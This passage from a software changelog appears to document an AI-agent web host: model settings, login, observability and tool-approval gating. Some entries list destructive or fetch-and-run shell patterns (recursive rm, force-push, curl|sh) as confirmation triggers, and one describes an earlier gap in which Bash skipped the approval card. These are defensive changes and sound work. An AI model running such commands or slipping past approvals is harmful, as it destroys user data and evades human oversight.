    non-allowlisted tools ask. `brain_archive` keeps its card.
  - **Context**: both `AGENTS.md` AND `CLAUDE.md` load when the brain repo has
    both (pi previously took AGENTS.md alone — the Claude backend reads
    CLAUDE.md, so the two backends saw different instructions). The
    system-prompt append is now built per session from the opening turn's
    client environment and turn budget, like the Claude backend's per-turn
    brief.
  - **Tools**: curated surface extended to the full brain MCP set
    (`brain_read`, `brain_list`, `brain_graph`, `brain_update`,
    `brain_archive`) plus bridge-backed `get_current_location` (reverse
    geocoding shared via `brain-ui-sdk/server`), `query_activity`, and
    `request_image_mask`, each registered per host capability.
  - **Extensions**: `loadExtensions` now defaults to true — the gate covers
    extension tools. Recommended: `pi-web-access` (web search/fetch,
    auto-allowed like Claude's WebSearch/WebFetch) and `pi-mcp-adapter` (MCP
    servers from `.mcp.json`, prompted like non-allowlisted MCP tools).
  - **rtk**: when the `rtk` binary is on PATH, both backends route bash
    commands through rtk's rewrite oracle (`git status` → `rtk git status`,
    60-90% less output for the model to read). Applied after gating, so
    confirm patterns see the original command; absent rtk changes nothing.
  - **Upstream bump**: pi SDK 0.80.10 → 0.84.4 (`pi-coding-agent`,
    `pi-agent-core`, `pi-ai`). Verified: event mapping already delta-based
    (0.84's `message_update` change), auth already on the `ModelRuntime` API,
    extension install + load re-tested on 0.84.4.
  - **Web search settings**: new Settings → Models → "Web search" card (pi
    deployments only). Provider select defaults to Auto — Exa's free keyless
    tier — with per-provider API keys (Exa, OpenAI, Brave, Tavily, Perplexity,
    Firecrawl, Jina, Kagi, Gemini) stored server-side in the pi config dir's
    `web-search.json`, the file pi-web-access reads. Key values never travel to
    the client; hand-edited config fields beside the managed ones survive; a
    save clears pi's extension cache so new conversations pick the change up.

### Patch Changes

- Updated dependencies [8b41fc3]
  - @schlessera/brain-ui-sdk@0.26.0
  - @schlessera/brain-render-template@0.26.0

## 0.25.0

### Minor Changes

- 02552ed: Per-model reasoning effort, editable in Settings → Models.

  - Effort-capable rows (the pi backend's profiles — Claude rows have no effort
    knob) get a tri-state effort select next to billing: "Default (<level>)"
    shows the configured level, an explicit pick is stored server-side
    (`PUT /api/models/thinking`, full record like hidden/billing) and applies
    to the NEXT new session — no env edit, no redeploy. Resumed sessions stay
    pinned.
  - `ProviderInfo.thinkingLevel` (additive) carries the effective level, and
    its presence marks a profile as effort-capable; `ModelCatalogEntry` gains
    `thinkingOverride`. `ThinkingLevel`/`THINKING_LEVELS`/`isThinkingLevel`
    join the sdk protocol.
  - `CreatePiBackendOptions.profiles` also accepts a function, re-read on every
    roster listing and model resolution, which is how the host applies settings
    overrides live.

### Patch Changes

- Updated dependencies [02552ed]
  - @schlessera/brain-ui-sdk@0.25.0
  - @schlessera/brain-render-template@0.25.0

## 0.24.0

### Minor Changes

- 88c03d9: Configurable default model, user-managed OpenRouter models, auto-collapsing
  thinking.

  - **Default model** (Settings → Models): the profile used when a turn names
    none — a fresh device's first conversation, a share filed into the brain,
    host-initiated actions. Stored server-side; "Auto" prefers a CONNECTED
    subscription account (pi's `openai-codex` — probed via the new
    `hasStoredCredential()` export, a cheap read of pi's auth store) and falls
    back to the built-in default. The resolved default also leads
    `/api/providers`, so a fresh picker lands on it.
  - **OpenRouter models** (Settings → Models): add or remove models by id
    (e.g. `z.ai/glm-5.3-flash`) with no env edit or redeploy. Stored ids join
    the Claude roster as declared OpenRouter profiles (api-billed via
    `OPENROUTER_API_KEY`); removing the model behind the stored default resets
    the default to auto.
  - **Thinking sections auto-collapse** when their streaming completes,
    leaving the "Thought for ~N tokens" affordance to reopen them.

### Patch Changes

- Updated dependencies [88c03d9]
  - @schlessera/brain-ui-sdk@0.24.0
  - @schlessera/brain-render-template@0.24.0

## 0.23.0

### Minor Changes

- 472a2d0: Sign in to pi model providers from Settings — no shell on the host needed.

  - `@schlessera/brain-backend-pi` exports `createPiAuth()`: a headless OAuth
    service over pi's `ModelRuntime.login` that answers the method prompt with
    the device-code flow (the browser flow would bind a callback port on the
    server), captures the user code from the auth event stream, and exposes a
    start/poll/cancel/logout surface. Credentials persist through pi's own
    locked store (`~/.pi/agent/auth.json`, `PI_CODING_AGENT_DIR` aware), so a
    login is immediately visible to the chat backend.
  - ui-server mounts `/api/pi-auth/*` behind the auth guard, lazily loading the
    optional pi package; provider ids are validated against the configured
    roster's vendors, and the endpoints report an empty provider list when pi
    is not in play.
  - Settings → Models grows an **Accounts** section (hidden on Claude-only
    deployments): Connect shows the device code and verification link, polls to
    completion, and Disconnect removes the stored credential. This is the
    intended path for connecting OpenAI (ChatGPT Plus/Pro) for the
    `openai-codex` gpt profiles.

### Patch Changes

- @schlessera/brain-ui-sdk@0.23.0
- @schlessera/brain-render-template@0.23.0

## 0.22.0

### Minor Changes

- 2a1c6c5: Run the pi backend alongside Claude, with declared model profiles — the path
  to OpenAI models under a ChatGPT subscription.

  - New `BRAIN_UI_PI_PROFILES` env var (JSON array of
    `{id,label,vendor,model,thinkingLevel?}`): when set with the default
    `AGENT_BACKEND=claude`, the pi backend joins the registry and its profiles
    join the picker. pi-ai's built-in `openai-codex` vendor authenticates only
    via ChatGPT Plus/Pro OAuth (`pi login`, device-code capable), so e.g.
    `{"id":"gpt-sol","label":"GPT-5.6 Sol","vendor":"openai-codex","model":"gpt-5.6-sol","thinkingLevel":"xhigh"}`
    runs on the subscription, not API tokens.
  - Fail-loud everywhere a wrong-but-plausible default could hide: malformed
    profiles JSON, duplicate/reserved ids (`default`, `claude`, `claude-*`),
    and invalid thinking levels refuse at boot; a missing pi package with the
    variable set refuses at boot; a declared vendor/model absent from pi's
    catalog rejects the turn instead of letting pi pick a provider; a resume
    whose saved model is unavailable rejects instead of silently substituting.
  - Billing classification keys on the profile vendor: `openai-codex` →
    subscription, other pi vendors (ambient API keys) → api. Claude
    classification is unchanged.
  - `PiProfile` gains `thinkingLevel` (passed to new sessions; pi clamps to the
    model's capability).

### Patch Changes

- d4261bb: Complete the per-backend tool-call rendering abstraction.

  The renderer registry was already backend-scoped, but the timeline hardcoded
  `backend: "claude"`, three code paths bypassed the registry (header label,
  touched-file summary, subagent-row gating), and risk advisories keyed on
  Claude tool names — so pi tool calls fell to the generic tier and risky pi
  `bash`/`write_file` inputs raised no approval-card advisories.

  - `session_info` now carries `backendId` (rev 3, additive); backends stamp
    their own, the host stamps stored sessions on resume/reattach. The client
    records it per session and scopes renderer resolution with it.
  - `ToolRenderer` grows `label`, `touchedFile`, `subagentRows`, and a
    backend-neutral `semantics` contract (`command`/`writePath`/`unsandboxed`);
    the timeline consumes only the renderer, no more name switches.
  - Risk rules now test semantics instead of Claude tool names, with a
    shape-sniffing fallback for renderers that declare none — the same rm -rf /
    force-push / curl|sh / writes-outside-repo advisories fire for every
    backend.
  - New pi renderer pack: `bash`, `read_file`, `write_file`, `edit_file`,
    `grep`, `brain_search`, `brain_context`, `brain_add` render with the same
    dedicated views (diff, file write, command, grep rows) as the Claude pack;
    pi's bare `ask_user` is recognized by the ask-user card grouping.

- 6f16547: Add `eval:triage` and `eval:triage:validate` scripts for the background-triage
  model gate.

  The eval itself lives in `evals/` and is not published — it is excluded from the
  package's `files` list, sits outside the test glob, and refuses to run without
  `BRAIN_UI_LIVE_EVALS=1` because it calls paid provider APIs. Only the two script
  entries are user-visible.

- Updated dependencies [d4261bb]
  - @schlessera/brain-ui-sdk@0.22.0
  - @schlessera/brain-render-template@0.22.0

## 0.21.0

### Patch Changes

- @schlessera/brain-ui-sdk@0.21.0
- @schlessera/brain-render-template@0.21.0

## 0.20.0

### Minor Changes

- d97dbd0: Cost tracking: dynamic pricing and effective spend, plus activity-detail quality-of-life.

  - **Dynamic model pricing** (ui-server): a TTL-cached pricing service merging
    LiteLLM's community price table with OpenRouter's live catalog, cached at
    `$BRAIN_PATH/.brain-ui/model-pricing.json` with a bundled offline snapshot;
    `BRAIN_UI_PRICING_DISCOVERY` / `BRAIN_UI_PRICING_TTL_HOURS` control it.
  - **Effective cost** (ui-server, migration 010): every run's rollup gains
    `effective_cost_usd` + `billing_mode` + `pricing_estimate`, computed inside
    the rollup transaction and frozen at first computation. Subscription-billed
    runs (ambient OAuth) are $0 out of pocket; API-key/OpenRouter runs are
    priced from per-model token usage. Unknown stays NULL — never $0.
  - **Billing classification** (ui-server): resolved per inference profile at
    run start (declared-credential profiles → api; ambient → subscription iff
    the OAuth token is the credential), overridable per profile from
    Settings → Models (`PUT /api/models/billing`).
  - **Dual-cost surfaces**: Activity spend cards, day/job/session rollups, the
    daily digest, and `query_activity` all carry effective cost plus an
    explicit unpriced-run count ("≥ $X · N unpriced"); run rows render
    three-state cost (unknown / free / priced, "~" for estimates); a staleness
    indicator appears when pricing refresh is failing (`GET /api/models/pricing`).
  - **Detail retention window** (ui-server): span trees survive at least
    `activity.retention.detailDays` (default 7) instead of dying at the next
    morning digest — nightly cron runs stay drillable.
  - **Tool I/O capture**: tool calls record clipped input/output payloads as
    span events, expandable in the Activity drill-in (subagent view and run
    detail); pre-capture runs state that no payload was recorded.

### Patch Changes

- 00565d5: Activity-layer review follow-ups (the items deferred from the 0.19.0 review):

  - **Watchdog** (ui-server): a per-job stuck-threshold override below the
    default now actually fires — the scan uses the smallest effective
    threshold, the per-span check still applies each job's own.
  - **Push retry** (ui-server): `send_failed` intents are retried with a
    3-attempt budget and 5-minute backoff (migration 009 adds
    `send_attempts`) — a transient push-service failure no longer forfeits
    push delivery for that notification.
  - **Restart notification** (ui-server): turns interrupted by a server
    restart now produce a failure intent — the boot orphan sweep runs after
    the notifier exists, so its terminal writes are seen by the first tick.
  - **Digest** (ui-server): generation is one immediate transaction and the
    covered-until write is monotonic — a manual run racing the cron job can
    no longer double-count a window or regress the retention floor.
  - **Prune index** (ui-server): migration 009 adds the partial index the
    hourly prune's candidate query needed and drops the unused
    `idx_activity_spans_session`.
  - **PushToggle** (ui-react): now performs the server-disagreement check —
    a subscription bound to a stale VAPID key is dropped (surfacing the
    re-enable button) and a server-side pruned row is healed by re-asserting
    the subscription.
  - **Span naming** (ui-sdk): the `execute_tool <name>`/`invoke_agent`
    convention is now exported protocol constants
    (`SPAN_OP_EXECUTE_TOOL`, `SPAN_OP_INVOKE_AGENT`, `SPAN_TOOL_NAME_PREFIX`)
    instead of three independent restatements.
  - **pi usage** (backend-pi): the turn-usage accumulator narrows the SDK's
    typed `message_end` variant instead of a hand-rolled double cast.

- Updated dependencies [d97dbd0]
- Updated dependencies [00565d5]
  - @schlessera/brain-ui-sdk@0.20.0
  - @schlessera/brain-render-template@0.20.0

## 0.19.0

### Minor Changes

- b15b5f0: Agent observability: a full activity layer across the stack.

  - **Activity record** (ui-server): an OTel-GenAI-aligned span store in the
    server SQLite records every turn, tool call, subagent run and cron run as
    a tree — written at start, closed write-once with a six-outcome taxonomy
    (`denied` and `interrupted` are first-class), with boot/staleness sweepers
    (heartbeat-keyed), a stuck-run watchdog, per-run rollups that survive
    pruning forever, and a digest-floor + hard-ceiling retention policy.
  - **Wire protocol** (ui-sdk, rev 3 additive): view-scoped
    `activity_subscribe`/`activity_snapshot`/`activity_delta` frames with a
    seq-discard ordering contract, a `usage` block (per-model token/cost
    breakdown) on `result`, and subagent linkage (`parentToolUseId`) on tool
    frames. `server_hello` advertises `capabilities.activity`.
  - **Backends**: the Claude adapter stops flattening subagent activity
    (task lifecycle, per-subagent usage, forwarded transcripts to the new
    bridge side channel; `forwardSubagentText` on; SDK floor 0.3.241) and
    reports full `modelUsage`; the pi backend reports per-turn token usage
    from its event stream. The new read-only `mcp__brain-ui__query_activity`
    tool lets the agent answer "what ran / what is running?" from the record.
  - **UI** (ui-react): live subagent rows with a stacked drill-in view
    (observation-shaped; approvals actionable there and in the chat), one
    server clock for live and reloaded duration badges, and a first-class
    Activity surface — live runs, history, rollup cards, failure inbox with
    nav badges, a while-you-were-away digest card, and a three-state web-push
    toggle. Activity takes the mobile tab-bar slot; Graph moves to More.
  - **Notifications** (ui-server): persisted intents (at-least-once, storm-
    capped, watched-suppressed) with an in-app inbox as the guaranteed tier
    and web push (generated VAPID keys in a secret-classified table,
    per-device subscriptions, minimized payloads, 404/410 pruning) on top.
  - `getCronStatus` now lists every recorded job name, closing the gap that
    hid module jobs from `/api/status`; the sessions listing merges stored
    cost accounting over backend zeros.

### Patch Changes

- Updated dependencies [b15b5f0]
  - @schlessera/brain-ui-sdk@0.19.0
  - @schlessera/brain-render-template@0.19.0

## 0.18.0

### Minor Changes

- a29b287: Harden the agent turn lifecycle against the failure modes found in the
  2026-08-23 fan-out incident (23 background subagents killed, tool aborts
  misread as user denials, one long Bash freezing every session's writes).

  - **Configurable turn timeout.** `BRAIN_UI_TURN_TIMEOUT_MS` now feeds
    `createApp()` (explicit option still wins); the host passes the live budget
    to backends as `StartTurnRequest.turnBudgetMs`, and the Claude backend puts
    the real number in the system prompt so the model sizes work to the cap.
  - **Keyed write locks replace the global mutex** (`createKeyedLock` in
    brain-ui-sdk; the old `createWriteLock` remains for the pi backend). The
    Claude backend now serializes per target file for Write/Edit/NotebookEdit,
    repo-wide only for git staging/history commands (and `brain sync|import`),
    and on one shared key for the brain document tools. Everything else — curl,
    builds, tests — takes no lock. Lock waits are bounded (`lockWaitMs`,
    default 30s, under the CLI's 60s hook timeout) and expire into a DENY with
    an explicit "retry" reason instead of stalling into the CLI's misleading
    "hook did not respond" refusal.
  - **Agent calls are rewritten to run in the foreground.** The SDK's Agent
    tool backgrounds subagents BY DEFAULT, and a background subagent dies with
    the per-turn subprocess. A PreToolUse hook rewrites
    `run_in_background` to `false` (and denies `isolation: "remote"`, whose
    results nothing could collect), telling the model why via
    `additionalContext`.
  - **Turn-lifecycle brief in the system prompt append**: per-turn subprocess
    semantics, the hard budget, incremental-write guidance, and how to read
    "the user doesn't want to take this action" / lock-busy errors (usually a
    cancelled turn or contention, not a human refusal).
  - **Approvals and ask-user cards survive disconnects.** A phone dropping its
    socket at screen lock no longer silently denies pending approvals; they are
    held (bounded by the turn timeout), re-delivered on reconnect, and an
    approval raised with no client attached logs a warning instead of parking
    invisibly. Location and mask requests keep their fail-fast behavior.

### Patch Changes

- Updated dependencies [a29b287]
  - @schlessera/brain-ui-sdk@0.18.0
  - @schlessera/brain-render-template@0.18.0

## 0.17.0

### Minor Changes

- fb4e218: Confirm destructive Bash commands, and stop implying approvals are containment.

  `Bash` is auto-allowed and the Agent SDK never consults `canUseTool` for an
  allow-listed tool, so `brain archive x.md` typed into Bash ran with no prompt
  while the identical operation through the `brain_archive` MCP tool raised an
  approval card. The brain repo's own CLAUDE.md documents the CLI form, so the
  gated path was the one an agent is least likely to take — the confirmation sat
  on the road nobody drives.

  A Bash command matching a configured pattern now raises the normal approval
  card, from the `PreToolUse` hook. That hook is the right place for the same
  reason the write lock lives there: it fires before every tool execution
  regardless of how the tool was permitted. The prompt happens BEFORE the write
  lock is taken, so a user deliberating does not block every other session.

  The pattern list is configuration, not code: `BRAIN_UI_CONFIRM_BASH` takes a
  JSON array of regex sources. Unset uses the shipped defaults (`brain archive`,
  recursive `rm`, `git push --force`, `git reset --hard`, `git clean -f`,
  `git checkout --`). An explicit `[]` disables confirmation and is honoured as
  given. A malformed value falls back to the defaults rather than throwing — a
  typo must not stop the server booting, and the safe direction to fail is more
  confirmation, not less.

  `brain archive` is on the list because archiving is a VISIBILITY change, not
  because it is hard to undo. An archived document drops out of search, briefings
  and context assembly, so a silent archive surfaces later as holes in output
  nobody can account for.

  SECURITY.md previously claimed "write-capable tools sit behind your agent's
  permission gating". That was not true and is now corrected, with a section
  stating plainly what approvals are: a seatbelt against a destructive command
  you did not intend, not a control that stops an agent working around it. The
  real boundary is auth.

### Patch Changes

- 210446f: Unify boolean environment parsing across all packages: every boolean variable
  now accepts 1/true/on/yes and 0/false/off/no (case-insensitive, trimmed), and
  an unset, empty, or unrecognised value falls back to the variable's documented
  default instead of being misread. Defaults and directions are unchanged;
  previously `"1"`-only flags (the Chrome sandbox switches, `TRUST_PROXY`,
  `BRAIN_UI_DANGEROUSLY_DISABLE_AUTH`, `BRAIN_UI_ALLOW_PASSWORD`,
  `BRAIN_UI_ALLOW_LOOPBACK_ORIGIN`) accept the full truthy set, and the disable
  set for `BRAIN_UI_REVERSE_GEOCODE` / `BRAIN_UI_MODEL_DISCOVERY` gains `no`.
  `NO_COLOR` keeps its presence-based contract. Published descriptor types
  (`ENV_VARS` shapes) are unchanged.
- b84e70f: Finish wiring the observability layer through the server: report what already failed silently.

  The layer itself was sound — OpenTelemetry API on the producing side, our own
  console/recording/in-memory consumers on the other — but adoption stopped at
  two instruments, so most failures still answered the browser and left no
  server-side trace.

  - Turn lifecycle: every turn now emits "turn started" / "turn completed"
    (INFO, with `session.id` / `turn.id` / `profile` and duration), and every
    turn-failure path that previously only sent an error frame — SESSION_BUSY,
    BACKEND_REQUEST_ERROR, BACKEND_ERROR, FOLLOWUP_FAILED, SESSION_LOAD_ERROR —
    also logs (WARN for busy, ERROR otherwise) and feeds a `turns.failed`
    counter keyed by the bounded error code. `turns.started` / `turns.completed`
    counters and the turn-timeout WARN's correlation ids come with it.
  - Auth: password logins are observable — WARN on a failed password and on the
    rate limit, INFO on success, and a distinct ERROR when `Bun.password.verify`
    throws (a corrupt BRAIN_UI_PASSWORD_HASH is no longer reported as a wrong
    password). Failures land on the same `auth.failures` counter passkeys use.
  - Request logging now runs through the observability layer (method, path,
    status, duration; no query strings or bodies) instead of hono's raw-console
    `logger()`, so BRAIN_UI_LOG_LEVEL governs it; `/api/health` is skipped.
  - `/api/health` performs a SELECT 1 liveness probe of the app database and
    answers 503 `{"status":"unhealthy"}` when it fails — the Docker healthcheck
    no longer reports healthy over a wedged SQLite handle.
  - The dead `log?` seams (graph/files/share/render/models routes, settings,
    keyterm builder, share staging, the backend registry) actually receive a
    logger from `createApp`, and session-catalog write failures WARN with the
    session id instead of being swallowed.
  - New `recordCronRun(db, jobName)` export lets an external scheduler (the
    container crontab in the shipped deployment) record runs into `cron_runs`,
    so `/api/status`'s `cronJobs` reflects what actually ran.
  - WebSocket: the upgrade handlers gained `onError` (WARN + `ws.errors`
    counter), and broadcast send failures count on `ws.frames.dropped` with
    reason `broadcast_send_failed`, direction `outbound`.
  - Backends take an optional minimal `log` callback (no OTel dependency):
    the Claude backend routes its unparseable-confirmBashPatterns warning
    through it (console.warn only when standalone), and the pi backend's
    resource-loader fallback — which silently dropped the chat-surface
    system-prompt append — now says so.

- 6e1fd43: Fix per-connection protocol state never reaching the WS dispatcher (declared
  protocolRev was dropped, so the rev-3 turnId-echo requirement was never
  enforced), extract the tool-view diff engine into `lib/diff.ts`, and clean up
  dead imports/variables surfaced by the new oxlint gate.
- a714ee1: Per-package `test` scripts now pass `--timeout 30000`, so `bun run test` inside a package no longer flakes on bun's 5s default when suites spawn the CLI.
- ef519d1: Harden the publish surface: what a consumer installs now matches what the
  declarations, bundler and runtime actually reach for.

  - `@schlessera/brain-backend-pi` declares `@earendil-works/pi-agent-core`
    (exact-pinned, like its sibling pi pins) instead of borrowing it from
    hoisting — its public `history.d.ts` types reference the package, so a
    strict installer (pnpm, npm with isolated modes) could not typecheck it.
  - `@schlessera/brain-ui-react` sets `sideEffects` to `["**/*.css"]` — the
    blanket `false` licensed bundlers to tree-shake a direct
    `import "@schlessera/brain-ui-react/styles.css"` away entirely.
  - `./theme.css` now resolves from `dist/` (copied verbatim at build) like
    `./styles.css` already did, so both stylesheets survive a dist-only tarball
    and the export map is uniform. The import specifier is unchanged.
  - `@schlessera/brain-module-finance`, `-images` and `-speaking` declare the
    same optional `@types/bun` peer that `-jobs` already carried: their module
    declaration graphs reach `bun:sqlite` types through `@schlessera/brain`.
  - Every package exports `"./package.json"` — tooling like Vite, Tailwind and
    Jest stats it, and the export map previously made that unreachable.
  - `engines.bun` is aligned with reality: bun-runtime packages require
    `>=1.3.5` (the CVE-2026-24910 floor `brain doctor` warns below), and
    packages that import cleanly under plain Node carry no bun engines field.
    Scrape keeps its (bumped) engines despite importing node-clean: its proxy
    fetch path shells out through `Bun.spawn`, so the runtime constraint is
    real even though the import is not.
  - Backend loading in `@schlessera/brain-ui-server` uses `await import()`
    instead of CJS `require()`, and only "the backend package itself is not
    installed" maps to the install-hint error. An installed-but-broken backend
    (missing transitive dep, syntax error, `ERR_REQUIRE_ESM`) now surfaces its
    real error instead of a misleading "not installed".

- Updated dependencies [a714ee1]
- Updated dependencies [ef519d1]
  - @schlessera/brain-ui-sdk@0.17.0
  - @schlessera/brain-render-template@0.17.0

## 0.16.0

### Minor Changes

- a7362e1: Move the client half of the wire protocol into the SDK, and validate both
  directions.

  `ui-sdk` described itself as owning the protocol while its `./client` subpath
  held only two registries: the actual transport was `ui-react`'s
  `ws-client.ts`, which cast every inbound frame, and dispatch handled 15 of the
  16 server frame types inside a React hook. Any non-React consumer — a CLI, a
  mobile shell, an integration test — reimplemented reconnection, framing and
  validation from scratch.

  - **`parseServerMessage`** validates server→client frames, with one schema per
    member bound to its interface by `satisfies` so the two cannot drift. The
    receiving policy is softer than the server's on purpose: a frame that fails
    is DROPPED and reported, never thrown, because the protocol is additive and a
    client that hard-fails an unrecognised frame turns every additive server
    change into a breaking one. Unknown keys survive the boundary.
  - **`BrainUiClient`** (`@schlessera/brain-ui-sdk/client`) is the transport:
    the same backoff and `reconnectNow` as before, plus validation,
    `server_hello` capture — so `protocolRev` and capabilities are readable
    rather than advisory — and `turnId` echo on turn-scoped replies, which finally
    gives the host's echo verification something to verify. A `socketFactory`
    option makes it testable with no network.
  - **`ui-react`** keeps every store write and becomes a handler set.
    `ws-client.ts` is deleted; `handleServerMessage` and `runStateForFrame` keep
    their signatures.
  - **`error` frames are no longer dropped outside a turn.** The old handler only
    appended to a streaming transcript, so an error between turns went nowhere —
    no console, no store, no UI. `useConnectionStore` gained `lastError`, and
    protocol-level drops land there too.
  - **A real-socket integration test** drives `BrainUiClient` against a real
    `createApp()`, closing the ROADMAP item about the auth boot refusal never
    being exercised through a socket. It is also the first test that would catch
    a client/server protocol drift, since both shipped implementations are on
    opposite ends of it.

  The frame parsers no longer use Node's `Buffer` — they accept
  `string | ArrayBufferView | ArrayBuffer` and measure UTF-8 length with
  `TextEncoder`. Both parsers now run on both ends of the socket, and the client
  end is a browser bundle; the build caught this the moment `ui-react` imported
  the SDK client.

  `turnId` is still not REQUIRED — that is a protocol-rev change with a
  deprecation window, deliberately out of scope.

- 3bfae80: Add swappable observability consumers, and instrument the WebSocket frame path.

  The producing side is the standard OpenTelemetry API — `logger.emit()`,
  `counter.add()` — so instrumentation is written once and stays portable. The
  consuming side is ours: a console consumer for production, a recording
  consumer for tests, an in-memory meter that `/api/status` reads. Choosing where
  reports go is an argument, never a change to instrumentation.

  `createApp({ observability })` and `new WsHost({ observability })` take one by
  injection, defaulting to the console consumer (WsHost defaults to silence, so
  an embedder gets no surprise stream on stdout). Nothing requires the
  OpenTelemetry globals; `installGlobally()` exists for code that cannot be
  handed an argument and returns a restore function, so a test cannot strand a
  sink for the next one. Two apps in one process report separately.

  `createRecordingObservability()` is the test surface: `logs.find({ scope,
severity, body, attributes })`, `metrics.value(name, attributes)`,
  `metrics.total(name)`, `metrics.snapshot()`. It is the same in-memory meter
  production uses, so an assertion is about the real recorder rather than a
  double. `createWsHandlers(host)` was split out of `createWsUpgrade` so a test
  drives the actual frame path without an HTTP server.

  Three holes are now instrumented. A `parseClientMessage` rejection was answered
  to the client and never logged — the inbound validation already shipped had no
  observability at all. A handler that threw sent `INTERNAL_ERROR` and discarded
  the cause. Both now emit, and dropped frames land on a `ws.frames.dropped`
  counter split by reason, exposed on `/api/status` next to `cronJobs`. Reported
  detail is always a bounded token, never the frame body, which is
  caller-supplied and capped at 12 MB.

  `@opentelemetry/api` is caretted (stable 1.x, zero dependencies).
  `@opentelemetry/api-logs` is pinned EXACT: the logs API is 0.x. That was
  measured rather than assumed — the producing surface is unchanged across
  0.57 → 0.221 and the global handshake is keyed on a compatibility constant that
  has stayed at 1, so mixed copies interoperate. The churn is in
  `@opentelemetry/sdk-logs`, which is precisely the package these consumers
  replace and which is not a dependency.

- 794c54c: Report through the observability layer instead of `console`, and make the
  threshold configurable.

  All 31 `console.*` sites in this package now emit through the injected
  `Observability`: structured, severity-filtered, assertable in a test, and
  routable somewhere else later without touching a call site. A test enforces
  it — AST-based, so the shell command inside an auth error message that
  contains the literal text `console.log` does not trip it. The console consumer
  itself is the one exemption, and the test asserts that exemption is still real
  so the list cannot rot.

  `BRAIN_UI_LOG_LEVEL` (default `INFO`) sets the console consumer's threshold. An
  unrecognised value falls back rather than throwing: a typo in a log level must
  not be why a server refuses to boot, and silently emitting nothing would be
  worse than emitting too much. The two security-critical boot messages —
  unknown `AUTH_MODE`, and `AUTH_MODE=none` deliberately permitted on a
  non-loopback host — emit at ERROR so a log threshold can never be the reason
  nobody saw them.

  Failed passkey ceremonies now increment an `auth.failures` counter split by
  reason and ceremony, alongside the log. A rate of those is what distinguishes
  one fumbled login from someone working through a list, and it was not
  recoverable from a log line nobody tails.

  Observability is constructed first in `createApp` — before the auth validation
  that can refuse to boot and before the migration runner — so nothing that can
  report is built before somewhere to report exists.

- 7ea32f7: Meter inbound WebSocket frames, and make `turnId` enforceable via a rev-3
  handshake.

  **Rate limiting.** Frames were size-, cardinality- and depth-bounded but not
  metered, so a flood of individually valid frames was unbounded behind the auth
  guard. Each connection now gets a token bucket — `BRAIN_UI_WS_RATE` (default 20
  frames/sec) and `BRAIN_UI_WS_BURST` (default 60), with `0` disabling it. A
  bucket rather than a fixed window because the real traffic is bursty: opening
  the app fires several frames at once and an approval storm is a dozen in a
  second, both legitimate. The bucket lives on the socket, not in a map keyed by
  something a peer controls — that map is itself the memory-exhaustion bug a rate
  limiter is supposed to prevent. Metering runs BEFORE parsing, since parsing is
  most of the work being bounded, and refusals land on the existing
  `ws.frames.dropped` counter under `reason: rate_limited`.

  **Protocol rev 3.** `turnId` could not be made mandatory because there was no
  client→server handshake: a host could not tell a current client from a
  two-year-old one, so enforcing would have broken every tool approval in older
  UIs. `client_hello` fixes that — a client declares its revision, and a host
  applies rev-3 rules only to connections that declared rev 3. Clients that send
  no hello are treated as rev 2 and keep today's tolerance indefinitely. This is
  therefore additive: no existing client changes behaviour.

  **A bug in the previous release's turnId echo is fixed here.** `BrainUiClient`
  tracked "the most recent turn id seen", which is correct with one session and
  wrong with two: a delta from session B arriving between session A's approval
  request and the user answering it made the reply carry B's id, the host refused
  the mismatch, and A's turn waited for an approval that could never be accepted
  — invisible until the ten-minute timeout. Turn ids are now tracked per request
  id and consumed when the reply goes out.

- 0fc9c44: Fix the five rough edges carried over from the extraction review.

  They were ported verbatim and never re-verified. All five were still real, and
  every one fails silently — which is why they survived: nothing errored, data
  just went missing or appeared in the wrong place.

  - **A follow-up sent mid-stream dropped every delta that followed it.**
    `mutateLastAssistant` indexed the END of the buffer, so once the user's
    second message was appended the still-streaming assistant message was no
    longer last, `role === "assistant"` failed, and each write was discarded. The
    turn kept running and its output stopped appearing. It now finds the last
    ASSISTANT message.
  - **Draft adoption could bind to another turn's session.** A client starting a
    conversation has no session id, so it adopted the first `session_info` or
    `result` for an unknown session — possibly an older background turn's, or
    another client's. `chat_message` gains an optional client-minted `draftId`,
    echoed on `session_info`, and adoption requires a match. Additive: a server
    that does not echo it falls back to the previous behaviour rather than
    leaving the draft unbound.
  - **The file store showed one file's content under another's name.** Two rapid
    clicks raced and the SLOWER fetch won. Both the success and error paths now
    drop a response for a path the user has already navigated away from.
  - **`whatsup` could deadlock.** stderr was only drained after
    `await proc.exited`, so a child that filled the pipe buffer blocked on write
    and never exited. It is drained concurrently with stdout now.
  - **The SPA fallback 404ed deep links from an absolute static root.**
    `serveStatic({ path })` resolves against the process cwd, so
    `join(staticRoot, "index.html")` only worked when `staticRoot` was itself
    cwd-relative — true of the shipped layout, not of an embedder passing an
    absolute directory. The fallback serves the file directly now.

### Patch Changes

- Updated dependencies [a7362e1]
- Updated dependencies [7ea32f7]
- Updated dependencies [0fc9c44]
  - @schlessera/brain-ui-sdk@0.16.0
  - @schlessera/brain-render-template@0.16.0

## 0.15.0

### Patch Changes

- @schlessera/brain-ui-sdk@0.15.0
- @schlessera/brain-render-template@0.15.0

## 0.14.0

### Minor Changes

- 59de559: - Added: every package reads the environment in one chokepoint that declares
  each variable, exports the contract (`ENV_VARS`, `resolveEnv`, `readEnvVar`)
  from the package entry, and generates its README env table from it.
  - Added: `ui-server` exports a resolved `ServerConfig` and returns an app handle
    (`config`, `db`, `wsHost`, `isTurnActive`, `cancelActiveTurns`, `close`), so
    two differently-configured apps coexist in one process.
  - Added: `openBrainDb`/`withBrainDb` gate every `brain.db` read on
    `schema_version`; `assertBackendResolvable` refuses to boot when the selected
    agent backend is not installed.
  - Changed: `@schlessera/brain-backend-claude` is an optional peer of
    `ui-server`, not a dependency — a deployment declares the backend it uses.
  - Changed: the module contract carries the config generic through
    `CommandContext`, `HygieneContext` and `CommandModule`, so a module author no
    longer casts a value the loader already validated.
  - Changed: the Gemini providers no longer delete and restore `GOOGLE_API_KEY`
    around client construction.
  - Removed: `configureDb`, `getDb`, `closeDb`, `configureWsHost`,
    `defaultWsHost`, `cancelActiveTurn`, `isTurnActive`, the `brainClient`
    namespace and the `getBackends`/`getBackendsInfo` module functions — their
    replacements live on the app handle.

### Patch Changes

- @schlessera/brain-ui-sdk@0.14.0
- @schlessera/brain-render-template@0.14.0

## 0.13.1

### Patch Changes

- @schlessera/brain-ui-sdk@0.13.1
- @schlessera/brain-backend-claude@0.13.1
- @schlessera/brain-render-template@0.13.1

## 0.13.0

### Minor Changes

- e7e0092: Bound a session's follow-up queue by bytes instead of by message count

  `MAX_SESSION_QUEUE = 5` was a placeholder with no reasoning behind it, and it
